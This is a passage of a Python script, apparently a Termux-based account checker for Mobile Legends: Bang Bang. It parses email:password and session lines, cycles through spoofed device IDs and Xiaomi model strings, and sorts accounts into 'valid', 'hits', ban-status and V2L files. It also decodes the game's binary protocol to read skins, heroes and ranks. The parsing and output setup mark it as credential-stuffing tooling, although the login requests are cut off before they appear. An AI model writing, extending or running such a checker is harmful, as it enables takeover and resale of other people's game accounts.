    'and_cd9e459ea708a948d5c2f5a6ca8838cfbfa9e8d2ca8be0394cce21fd-5374-42be-951f-4990f736ff2c',
    'and_cd9e459ea708a948d5c2f5a6ca8838cff2b1da7305e1dffec3fb85d4-0239-4f49-b9ec-0e5c99005703',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfd2978bfecb3aceccfe691d64-3b33-4fe5-af3f-6e888a681257',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfc8ddc664dee7149d6cb4b247-0b67-492a-a43c-287e9106cc97',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf22964dffd0870bc7da2b02c4-0e77-4826-b16f-f8a25eae57d3',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf0ac661a68adfdbbbee67bd9f-dfc1-40d9-ba6f-a0b598898c5f',
    'and_cd9e459ea708a948d5c2f5a6ca8838cff2cadbc1a18d75adeb5b5124-6975-4bec-8fad-6d1a225a9263',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfaba0aa987f7eb01ff40d310d-e8c0-492b-bece-dea5fedbfa59',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfce5ba037f68d44b51c7fcfe6-b22c-4c0c-b016-a3dfef632674',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf4ba489cc821a1a7700f53a76-87ad-4d77-8baf-017ab78b8c9a',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfac63a4503b9c34bbb4088197-9d7e-4e96-8cfb-5cf7a328a835',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfa832e1fb3dbf4ba623e46c73-cec8-4dba-9685-2618e4a86016',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfcc2f5d441f8bd2d41c638333-61aa-4d57-a93d-64c94bf577f9',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf4fa2e9f9c75a3214dde0eddd-8b46-47df-b89e-67b4c31d430f',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfbb04aa029f71057a2a46fe41-f510-4f1d-b858-d0189d34d71a',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfdc82fee7d5c53eee2b752e28-6627-4cc4-b0eb-56e21d35736c',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfd80ebfeba649fa0deb83cb2c-4724-4c46-8606-bf9175924eae',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf9bbaa7a5cfd60efed895c9a7-b344-4bd3-a9b3-019ba1f41f87',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfe7a950d8e8cf52cb4418912e-80fe-4342-b84e-68647d8f3fe6',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf0acd0ba5dfbe514fd9ac0861-6068-44b5-b0e9-2c3e276a6108',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfb92fbb2adcfef214fc378da5-e560-40d0-965c-0e1556943f5f',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfd3e96aedafd6f72498ab4d89-182b-4af0-82f7-83851f6d2c51',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf8ad59e11b466c00706335c04-8b53-4fdc-974c-ca94f6b25cc9',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf7dbb23fddde7367c932e5c1b-4dc5-4de8-85e2-efa39377f9a0',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfdaa73ad5e43b8363d264b462-abf0-47c5-917b-c51069d2cb56',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfd0fe262be19ed7fa72d7d47f-50b5-490c-9985-abfa110ab12a',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf7f0318c5edab1aca7e48fbad-716e-4e01-a181-8bf384b4b096',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf3c73872eea58dbb968880ffe-30c2-4824-975f-47a0b85b4973',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfdc3c02e3c023f6ecad75921d-ed2b-416e-8f37-86501a73ad1c',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf77cf6e7ffc1f12fab9401fea-4b40-4f73-b931-c6a719614c5a',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfcc8ebd39d22df471763b11a3-e932-45b7-a4e7-0d46ba0025af',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfeebbfea571fae366468c793b-2161-42b6-9ecf-faaebc17a22a',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfdefc95aecf96f9fab0e92d9a-a357-42b9-ab14-596c0fb8485e',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf999f3aabdb4d95b7b28975c9-c727-423c-bb44-5c415532dfda',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfbcfc61aebaf349eaac0a9d14-e3a9-4787-b7d2-8b06974ddcac',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfcef90be75a5e2c4d5ee621ba-372a-4215-9082-8885df519eaf',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf56ff4d5f004b1aaa0ac9045c-0fb7-4595-87a9-e1e59ec367bd',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf95bcbb31fc7bb9e720349adb-b518-476d-ac2f-89d27b712172',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfddc0caabffb8fd79d6b512d7-c8ea-4ab2-a74d-20f4bfd4a30a',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfabc6cfd5b16596991307e85b-c920-4480-9d73-7a7b491b2d8f',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfaab5cf9a1b966efe0210bc95-0ed1-4755-ac66-271fed66eb91',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfad640d4ac0f2737f3135e924-afd0-44dd-879a-dcda87b3c363',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfafdcaae9b561b22d378f1417-b9ea-415a-b8bc-d6447ea5394c',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfaa7553e5cc0ebd47052b6584-c65b-4c8a-8dd8-1d3dcd0e3a4b',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf2f1aeb6f1c0db1427972c074-7d31-4d6d-83e8-3e59f124ad9c',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfaf0b3e54eabfdf2cd1f8acac-2df0-405d-9911-3af9ead8c2bd',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf18ffba90b3ed5a1c7fadc4b9-9262-4d4e-b9fa-aa4eb9f18b94',
    'and_cd9e459ea708a948d5c2f5a6ca8838cffc20088de76a47af724bb37c-8c11-43e2-a0ce-4cd90a6d5cfd',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfb7f31bbdbfbc146ef1a7de9f-3cb8-4096-ba3c-0c68dbd3b8a6',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfc9a2dd1b3fa7bd451be5905e-e631-4d7e-b3f3-1e895f084cda',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfcca8aa0c55a26b9b5a4eb434-0b79-4ce8-8245-dd35b75ede65',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfa16a4daeaae1ec0bd7b25aa9-c99c-4663-90d9-a1744667d21b',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfd5d42b1eddda5db0de82914c-c866-4edb-82f8-051481a0795f',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfa0160a58b92f8051a1c665d1-cb37-478f-a823-6e8244ceba35',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf0c4dcacdfd2f5dfec768275d-278a-4391-9ef5-7454be401658',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfba3cf7ce8763e2252d783627-9451-4f2b-a61d-84c83d95b58d',
    'and_cd9e459ea708a948d5c2f5a6ca8838cff07bee9baece23b4b14e7d35-a5f1-486d-bedf-e72fe27f331e',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf5ceedd7c9edc8c3bd5693513-0438-4eb6-9bb0-1fc44f0423fa',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfc06feccccfaa2b68958c5120-290f-451b-b9b1-d0b4172ca68c',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf5af1a7feeb7ba6f36672d0e7-d257-4061-a1c0-9c3b7a422bdb',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfd7eb3e5b0d8bfb6e86e4901f-3270-476a-95d7-388c9bc8c6c8',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf696ee7b7a7dc3a124869a521-7861-4146-80b3-9978490a8bf6',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf03f2036a384aaa5580674319-2685-49fa-998c-4f13987c6952',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfd3cfcd3fa9a7f90136c1c9c5-e3bf-45f7-ac73-6b4df6eca51c',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf77dd75b3effc9abcce868487-7d0f-4667-a912-122172147537',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf81dfdbe4daf6e47f41ef2207-6567-4683-8c4b-0ddb048be338',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfbcffa1abc3da88da9024e4f7-0ab1-4c3a-8e9f-b4562318578e',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf85b4c4b6bee84e5dd52098c0-7745-4c28-a0ff-8204d2c8e940',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf70df1bf4c3dfbdfbd5f7834d-1555-49bf-a80c-10dad862ba0b',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf033feb7bca491fcb29c4698b-2ffa-47a8-973f-3d75a0a2c1ae',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf40d46725ddfdee55ab7e2886-6792-4b4c-b9be-aba21dd84391',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf7a86f6ea8a3cce3e30d71f47-72f8-467d-b85e-d123763097c5',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf157eda38675c4f5ee6d796a0-f953-4c88-a86d-48c821516c27',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf16ea5fe92e77ea16e41b7bfb-839d-4403-8a6f-2aac887165d2',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf49a882d3996c311b075b88e3-fe5c-4ea3-9aa3-fef9ffe997e7',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf01c9d6bba5db9818597f52f1-b35d-40bc-b630-8a31022c3737',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf69ffa33a1f0cbe820a9c104f-8a3a-4f1e-b264-2f95773c717e',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfa91de559cb13a1ba42d127d6-5f52-4b90-8b06-642936e52be7',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfd5fca2af20ac30c98436110e-a848-4d4b-95cd-663f8085b711',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfba9acccbde242f5b2951b22b-e2e6-4244-8689-be52edff1121',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf68c0eeb05fe1d26889ab260d-8b79-4b7c-a4a5-4023d9acb2c4',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfbf8d474f91adabf7fa6b5fae-63bb-4218-a827-0b6835fbf7f2',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf602d086aaa9ad28319110b3a-ab04-4347-af06-1a328cc66f31',
    'and_cd9e459ea708a948d5c2f5a6ca8838cff3e7f2aaee7a6f8ea91760fe-541f-4e88-8c56-854f6e4224ad',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfa19de3ebbfedc4afbfbb0e3a-2486-4229-acc9-3c7e8ea7d767',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfe6daeac3bb734fd954bc5298-26af-40a2-bc1a-fa5f8eac8bf7',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfafdf6c9ebe10478fe7c9debc-46cf-46f7-935b-537f28bb51be',
    'and_cd9e459ea708a948d5c2f5a6ca8838cffd0c25d3c6fc2f2f8f36a6ac-6311-48bf-b2dc-740f12b26b7e',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf3dac47ea277ddb88d2e27453-25d0-4a55-bee8-16ea424ca033',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfe1cd5c7f9b4dabbc117a8d2a-47d0-4fcb-90ec-a2bbf11200e1',
    'and_cd9e459ea708a948d5c2f5a6ca8838cffc1ca0fe7bb77d8c60cf5353-0b0f-4c05-8b14-2432214dd540',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf68ffad777cffcd13a336c627-7247-4cbe-926c-2a2bf0e7ccc8',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfedde246a0b3d439aea0338bb-e1b8-4f1e-a810-0879377da5e1',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf28e4fd0c5fa459713f21ba99-9885-436f-8eae-0055a94774d5',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf891c6e8c3861cfead21fe2a9-ef7d-4ca2-9ae5-5ec4f10c4b4b',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfade0d911c67feac4dc42b43e-837d-480c-b11a-73c57ae79e62',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfd29df257ca1aace7b9fedb52-4b4f-40df-a4e3-283c0a0c53be',
    'and_cd9e459ea708a948d5c2f5a6ca8838cff830403ec5b0104760e40a82-de40-4710-bce7-b3417ee587a6',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfaf53fb554c3048a86efc5f35-9755-4152-982b-afdd955be7ca',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfb4f709d5c85befc1ac12b9e4-09ca-4b8b-bf29-b3703dc1144e',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfcf8d7b1d87bec99a4767237f-1a07-4140-8655-68ffd95498b4',
    'and_cd9e459ea708a948d5c2f5a6ca8838cffe3aa94dcedb5c118f25772c-f6e5-4368-9545-9c8d28985e49',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf3e845a0b2fa9af5b34a0841a-a27a-43c2-b849-9748e93b7749',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfb7170f533de226252a7e28f8-fdf7-45ff-9030-9fa7dac92b34',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf51bbf31b05af2f3c1311cc86-593e-47ea-97fc-5ae1b94879b8',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfe4b9a5f7af8aab9c19b484d1-7ebe-4840-b247-6ccc661e51ba',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfc51bf37be2d51c5ac92454ea-f624-4d6e-ad10-7fe8d1c47b95',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf9dfbe9854abbbf7402f05e0d-2793-4313-89db-26ee496c7665',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf3a885dad8a562bca93962824-dec7-40db-9be1-cf92e6564f76',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfbc23bace313af36f65619511-78fb-4334-bc8a-423d7e993134',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfec3bd082be884cbc973e647b-b2bf-4cf0-9903-054d239cac3d',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfb4cb5ccb313caa8ae2d70b28-4082-4dc2-8969-f38010edd6ae',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf8c57da5ae5aaf16a8e4f31c2-8eaf-4420-a22e-9c6fd303b35b',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfec07f9aeae6dfdff51c8bd17-b31d-44c4-8188-6127deae4f1b',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf2ef1ffd13ba8ef7bdbf891c4-fd30-4c10-989c-0adffa1951ef',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf1e5f7b2e66b3fa9da26a03bc-16f0-4491-9309-5c86209d4abe',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf8daeb5a8a4de04cc0bf5dad1-311c-430d-be5f-a68451f7f125',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfe538f18fcf53b0dc489efc76-e5e4-49cf-b1a3-911d08087db0',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf0defc71615adfb954af58994-d917-4d74-8ad5-6bab9b92cebd',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf131f2dc65663a7d5374b817f-933c-4a0b-bd89-d2d16ae275d1',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf1220b7ca219ff6c29bfe0354-89d2-4e53-b776-9874964d4147',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf4ea5bde1e4c0d54d4b29b938-22f3-4194-8554-19f34f470d32',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfcadeeb39cec71bdff5744d40-7c33-4e31-80c2-0f7b4dfd7e09',
]

DEVICE_MODELS = [
    'Xiaomi:23049PCD8G', 'Xiaomi:2201123G', 'Xiaomi:22011211C', 'Xiaomi:2211133C', 'Xiaomi:23078PND5G', 'Xiaomi:22101316G',
    'Xiaomi:Redmi Note 12', 'Xiaomi:Redmi Note 12 Pro', 'Xiaomi:Redmi Note 11', 'Xiaomi:Redmi 12C', 'Xiaomi:Redmi 10', 'Xiaomi:Mi 11',
    'Xiaomi:Mi 11 Ultra', 'Xiaomi:23013RK75G', 'Xiaomi:2304FPN6DG', 'Xiaomi:23054RA19I', 'Xiaomi:22071219CG', 'Xiaomi:2206123SC',
    'Xiaomi:220733SG', 'Xiaomi:22041219NY', 'Xiaomi:2203121C', 'Xiaomi:2201116SG', 'Xiaomi:220333QNY', 'Xiaomi:22101316C',
    'Xiaomi:2210132C', 'Xiaomi:220733SPG', 'Xiaomi:2211133G', 'Xiaomi:2304FPN6DC', 'Xiaomi:23090RA98C', 'Xiaomi:23106RN0DA',
    'Xiaomi:2312DRA50C', 'Xiaomi:2201123C', 'Xiaomi:2211101C', 'Xiaomi:2304FPN6DI', 'Xiaomi:2207117BPG', 'Xiaomi:2112123AC',
    'Xiaomi:22120RN86G', 'Xiaomi:2206122SC', 'Xiaomi:22041216I', 'Xiaomi:2207117BPI', 'Xiaomi:Redmi Note 13', 'Xiaomi:Redmi Note 13 Pro',
    'Xiaomi:Redmi 13C', 'Xiaomi:Redmi A3', 'Xiaomi:POCO X6', 'Xiaomi:POCO M6', 'Xiaomi:POCO C65', 'Xiaomi:POCO F6', 'Xiaomi:Mi 14',
    'Xiaomi:Mi 14 Ultra',
]

# ── SETUP OUTPUT DIRECTORY ──────────────────────────────────────────
# Termux အတွက် storage path
HOME = os.path.expanduser("~")
OUTPUT_DIR = os.path.join(HOME, "storage", "downloads", "mlbb_results")
# ဒါမှမဟုတ် လက်ရှိ folder ထဲမှာ သိမ်းချင်ရင်:
# OUTPUT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "results")

os.makedirs(OUTPUT_DIR, exist_ok=True)

VALID_FILE     = os.path.join(OUTPUT_DIR, "valid.txt")
ERROR_FILE     = os.path.join(OUTPUT_DIR, "errors.txt")
V2L_YES_FILE   = os.path.join(OUTPUT_DIR, "V2L_Enabled.txt")
V2L_NO_FILE    = os.path.join(OUTPUT_DIR, "V2L_Disabled.txt")
BAN_TRUE_FILE  = os.path.join(OUTPUT_DIR, "ban_true.txt")
BAN_FALSE_FILE = os.path.join(OUTPUT_DIR, "ban_false.txt")
ALL_HITS_FILE  = os.path.join(OUTPUT_DIR, "all_hits.txt")

# ── DEBUG HELPERS ────────────────────────────────────────────────────
def dbg(label, data=None, color=Fore.MAGENTA):
    if not DEBUG_MODE:
        return
    ts = datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3]
    if data is None:
        print(f"{color}[DBG {ts}] {label}{Style.RESET_ALL}")
    else:
        print(f"{color}[DBG {ts}] {label}{Style.RESET_ALL}")
        if isinstance(data, (bytes, bytearray)):
            hex_str = data.hex()
            for i in range(0, len(hex_str), 64):
                print(f"  {Fore.CYAN}{hex_str[i:i+64]}{Style.RESET_ALL}")
        elif isinstance(data, dict):
            for k, v in data.items():
                print(f"  {Fore.CYAN}[{k}] => {repr(v)[:120]}{Style.RESET_ALL}")
        else:
            print(f"  {Fore.CYAN}{repr(data)[:200]}{Style.RESET_ALL}")

def parse_device_line(line):
    info = {}
    lines = line.strip().split('\n')
    for l in lines:
        l = l.strip()
        if l.startswith('Device ID:'):
            info['device_id'] = l.split('Device ID:', 1)[1].strip()
        elif l.startswith('Account ID:'):
            try:
                info['account_id'] = int(l.split('Account ID:', 1)[1].strip())
            except:
                info['account_id'] = l.split('Account ID:', 1)[1].strip()
        elif l.startswith('Zone ID:'):
            try:
                info['zone_id'] = int(l.split('Zone ID:', 1)[1].strip())
            except:
                info['zone_id'] = l.split('Zone ID:', 1)[1].strip()
    return info if info.get('device_id') else None

def parse_account_line(line):
    MULTICOLON_KEYS = {
        'Session', 'Ban Reason', 'Bindings', 'Name',
    }

    try:
        parts = line.split('|')
        account_info = {}

        email_pass = parts[0].strip()
        if ':' in email_pass:
            email, password = email_pass.split(':', 1)
            account_info['email'] = email.strip()
            account_info['password'] = password.strip()

        for part in parts[1:]:
            part = part.strip()
            if not part:
                continue
            if ':' in part:
                key, value = part.split(':', 1)
                key   = key.strip()
                value = value.strip()
                account_info[key] = value

        import re
        session_match = re.search(r'Session:\s*([^\|]+)', line)
        if session_match:
            session_value = session_match.group(1).strip()
            account_info['Session'] = session_value

        guid = account_info.get('Guid', None)
        if guid and 'role_id' not in account_info:
            try:
                account_info['role_id'] = int(str(guid).strip())
            except ValueError:
                pass

        role_id = account_info.get('Role ID', None)
        zone_id = account_info.get('Zone ID', None)

        if role_id and zone_id:
            try:
                account_info['role_id'] = int(str(role_id).strip())
                account_info['zone_id'] = int(str(zone_id).strip())
            except ValueError:
                print(f"{Fore.RED}Error: Role ID or Zone ID is not a valid integer.{Style.RESET_ALL}")
                return None

        uid = account_info.get('UID', None)
        if uid:
            import re
            uid_match = re.search(r'(\d+)\s*\((\d+)\)', uid)
            if uid_match:
                account_info['role_id'] = int(uid_match.group(1))
                account_info['zone_id'] = int(uid_match.group(2))
            else:
                try:
                    account_info['role_id'] = int(uid.strip())
                except ValueError:
                    pass

        if account_info.get('email') and account_info.get('password'):
            return account_info

        return None
    except Exception as e:
        print(f"{Fore.RED}Error parsing line: {e}{Style.RESET_ALL}")
        return None


HERO_ID_MAP = {
    1: "Miya", 2: "Balmond", 3: "Saber", 4: "Alice", 5: "Nana", 6: "Tigreal", 7: "Alucard", 8: "Karina", 9: "Akai",
    10: "Franco", 11: "Bane", 12: "Bruno", 13: "Clint", 14: "Rafaela", 15: "Eudora", 16: "Zilong", 17: "Fanny",
    18: "Layla", 19: "Minotaur", 20: "Lolita", 21: "Hayabusa", 22: "Freya", 23: "Gord", 24: "Natalia", 25: "Kagura",
    26: "Chou", 27: "Sun", 28: "Alpha", 29: "Ruby", 30: "Yi Sun-shin", 31: "Moskov", 32: "Johnson", 33: "Cyclops",
    34: "Estes", 35: "Hilda", 36: "Aurora", 37: "Lapu-Lapu", 38: "Vexana", 39: "Roger", 40: "Karrie", 41: "Gatotkaca",
    42: "Harley", 43: "Irithel", 44: "Grock", 45: "Argus", 46: "Odette", 47: "Lancelot", 48: "Diggie", 49: "Hylos",
    50: "Zhask", 51: "Helcurt", 52: "Pharsa", 53: "Lesley", 54: "Jawhead", 55: "Angela", 56: "Gusion", 57: "Valir",
    58: "Martis", 59: "Uranus", 60: "Hanabi", 61: "Chang'e", 62: "Kaja", 63: "Selena", 64: "Aldous", 65: "Claude",
    66: "Vale", 67: "Leomord", 68: "Lunox", 69: "Hanzo", 70: "Belerick", 71: "Kimmy", 72: "Thamuz", 73: "Harith",
    74: "Minsitthar", 75: "Kadita", 76: "Faramis", 77: "Badang", 78: "Khufra", 79: "Granger", 80: "Guinevere",
    81: "Esmeralda", 82: "Terizla", 83: "X.Borg", 84: "Ling", 85: "Dyrroth", 86: "Lylia", 87: "Baxia", 88: "Masha",
    89: "Wanwan", 90: "Silvanna", 91: "Cecilion", 92: "Carmilla", 93: "Atlas", 94: "Popol and Kupa", 95: "Yu Zhong",
    96: "Luo Yi", 97: "Benedetta", 98: "Khaleed", 99: "Barats", 100: "Brody", 101: "Yve", 102: "Mathilda",
    103: "Paquito", 104: "Gloo", 105: "Beatrix", 106: "Phoveus", 107: "Natan", 108: "Aulus", 109: "Aamon",
    110: "Valentina", 111: "Edith", 112: "Floryn", 113: "Yin", 114: "Melissa", 115: "Xavier", 116: "Julian",
    117: "Fredrinn", 118: "Joy", 119: "Novaria", 120: "Arlott", 121: "Ixia", 122: "Nolan", 123: "Cici",
    124: "Chip", 125: "Zhuxin", 126: "Suyou", 127: "Lukas", 128: "Kalea", 129: "Zetian", 130: "Obsidia"
}

# ── SKIN DATABASE ────────────────────────────────────────────────────
import json as _json
_SKIN_DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skin_db.json')
try:
    with open(_SKIN_DB_PATH, 'r', encoding='utf-8') as _f:
        _raw = _f.read().strip()
        if not _raw.startswith('{'):
            _raw = '{' + _raw
        SKIN_DB = _json.loads(_raw)
except Exception:
    SKIN_DB = {}

SKIN_TIER_LABELS = {
    'common':      'Common',
    'exceptional': 'Exceptional',
    'deluxe':      'Deluxe',
    'exquisite':   'Exquisite',
    'grand':       'Grand',
    'supreme':     'Supreme',
    'unknown':     'Unknown',
}

def get_skin_tier(skin_id):
    tier = SKIN_DB.get(str(skin_id))
    if not tier:
        return None
    return SKIN_TIER_LABELS.get(tier, tier.capitalize())

def parse_skin_counts(tag_118):
    if not tag_118 or not isinstance(tag_118, dict):
        return {}
    
    skin_data = tag_118.get(4, tag_118.get('4', {}))
    if not isinstance(skin_data, dict):
        return {}
    
    skin_types = {
        6: "Supreme Skins",
        5: "Grand Skins", 
        4: "Exquisite Skins",
        3: "Deluxe Skins",
        2: "Exceptional Skins",
        1: "Common Skins"
    }
    
    skin_counts = {}
    total_skins = 0
    
    for skin_id, count in skin_data.items():
        if skin_id in skin_types:
            skin_counts[skin_types[skin_id]] = count
            total_skins += count
    return skin_counts

def get_hero_history(tag_91):
    return [HERO_ID_MAP.get(hid, f"Unknown({hid})") for hid in reversed(tag_91)]

def map_collector_point(point: int) -> str:
    if point < 1000:
        return "No Tier"

    tiers = [
        (1000, 4000, "Amateur Collector"),
        (4000, 10000, "Junior Collector"),
        (10000, 22000, "Seasoned Collector"),
        (22000, 44000, "Expert Collector"),
        (44000, 84000, "Renowned Collector"),
        (84000, 160000, "Exalted Collector"),
        (160000, 280000, "Mega Collector"),
        (280000, float('inf'), "World Collector"),
    ]

    for min_p, max_p, name in tiers:
        if min_p <= point < max_p:
            if name == "World Collector":
                return name

            per_level = (max_p - min_p) / 5
            level = int((point - min_p) // per_level)
            roman = ["V", "IV", "III", "II", "I"][level]
            return f"{name} {roman}"

    return "Unknown"
        
def map_rank(p):
    RANK_DEFINITIONS = [
        {"min": 0,   "max": 4,   "rank": "Warrior III"},
        {"min": 5,   "max": 9,   "rank": "Warrior II"},
        {"min": 10,  "max": 14,  "rank": "Warrior I"},
        {"min": 15,  "max": 19,  "rank": "Elite IV"},
        {"min": 20,  "max": 24,  "rank": "Elite III"},
        {"min": 25,  "max": 29,  "rank": "Elite II"},
        {"min": 30,  "max": 34,  "rank": "Elite I"},
        {"min": 35,  "max": 39,  "rank": "Master IV"},
        {"min": 40,  "max": 44,  "rank": "Master III"},
        {"min": 45,  "max": 49,  "rank": "Master II"},
        {"min": 50,  "max": 54,  "rank": "Master I"},
        {"min": 55,  "max": 59,  "rank": "Grandmaster IV"},
        {"min": 60,  "max": 64,  "rank": "Grandmaster III"},
        {"min": 65,  "max": 69,  "rank": "Grandmaster II"},
        {"min": 70,  "max": 74,  "rank": "Grandmaster I"},
        {"min": 75,  "max": 81,  "rank": "Epic IV"},
        {"min": 82,  "max": 88,  "rank": "Epic III"},
        {"min": 89,  "max": 95,  "rank": "Epic II"},
        {"min": 96,  "max": 107, "rank": "Epic I"},
        {"min": 108, "max": 114, "rank": "Legend IV"},
        {"min": 115, "max": 121, "rank": "Legend III"},
        {"min": 122, "max": 128, "rank": "Legend II"},
        {"min": 129, "max": 135, "rank": "Legend I"},
        {"min": 136, "max": 160, "rank": lambda p: f"Mythic {p - 135}"},
        {"min": 161, "max": 195, "rank": lambda p: f"Mythical Honor {p - 135}"},
        {"min": 196, "max": 235, "rank": lambda p: f"Mythical Glory {p - 157}"},
        {"min": 236, "max": 999, "rank": lambda p: f"Mythical Immortal {p - 157}"},
    ]
    for entry in RANK_DEFINITIONS:
        if entry["min"] <= p <= entry["max"]:
            rank = entry["rank"]
            return rank(p) if callable(rank) else rank
    return "Unknown"
        
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SdpDataType(Enum):
    INTEGER_POSITIVE = 0
    INTEGER_NEGATIVE = 1
    FLOAT = 2
    DOUBLE = 3
    STRING = 4
    LIST = 5
    DICT = 6
    STRUCT_BEGIN = 7
    STRUCT_END = 8

class SdpException(Exception):
    def __init__(self, message):
        self.message = message
        super().__init__(self.message)

class SdpStruct(dict):
    def __init__(self, data=None):
        super().__init__()
        self.data = b''
        self.offset = 0
        
        if isinstance(data, bytes):
            self.data = data
            self.offset = 0
            self._unpack_from_binary()
        elif data is not None:
            super().update(data)
            self._pack_to_binary()
    
    def _pack_to_binary(self):
        self.data = bytes([SdpDataType.STRUCT_BEGIN.value << 4])
        for tag, value in sorted(self.items()):
            self._pack(tag, value)
        self.data += bytes([SdpDataType.STRUCT_END.value << 4])
    
    def _unpack_from_binary(self):
        if not self.data:
            return
            
        if self.data[0] >> 4 == SdpDataType.STRUCT_BEGIN.value:
            self.offset = 1
            
        while self.offset < len(self.data):
            tag, value = self._unpack()
            if isinstance(value, SdpDataType) and value == SdpDataType.STRUCT_END:
                break
            self[tag] = value
    
    def _write_number(self, value: int) -> bytes:
        result = bytearray()
        while value >= 0x80:
            result.append((value & 0x7F) | 0x80)
            value >>= 7
        result.append(value & 0x7F)
        return bytes(result)
    
    def _read_number(self) -> int:
        n = 1
